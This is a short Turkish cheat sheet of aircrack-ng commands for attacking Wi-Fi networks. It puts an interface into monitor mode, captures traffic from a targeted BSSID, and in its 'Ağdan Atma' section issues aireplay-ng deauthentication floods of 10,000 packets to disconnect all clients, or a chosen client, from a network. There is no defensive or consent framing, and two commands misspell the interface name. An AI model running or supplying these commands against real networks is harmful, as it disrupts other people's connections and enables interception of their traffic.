# Ağlar İle İlgili Bilgi Toplama

Kablosuz ağlar üzerinde analiz yapmak için kullanılan temel komutlar aşağıdadır.

- > airmon-ng start wlan0 // Monitor moda geç
- > iwconfig // Kontrol
- > airodump-ng wlan0mon // Ağların bilgileri. Çevredeki Wi-Fi ağları, Kanal bilgileri, BSSID (MAC adresi), Bağlı cihazlar.

- > airodump-ng --channel 9 --bssid E4:C3:2A:B7:23:90 --write airodumptest wlan0mon // --channel → Ağın yayın yaptığı kanal, --bssid → Hedef ağın MAC adresi, --write → Çıktıyı dosyaya kaydetme

## Ağdan Atma

--Tüm Cihazları Ağdan Atma--

- > aireplay-ng --deauth 10000 -a E4:C3:2A:B7:23:90 wlam0mon // --deauth 10000 → 10000 adet deauth paketi gönderir, -a → Hedef ağın BSSID adresi

--Belirli Cihazları Ağdan Atma--

- > aireplay-ng --deauth 10000 -a E4:C3:2A:B7:23:90 -c {atmak istediğimiz ağın mac adresi} wlam0mon
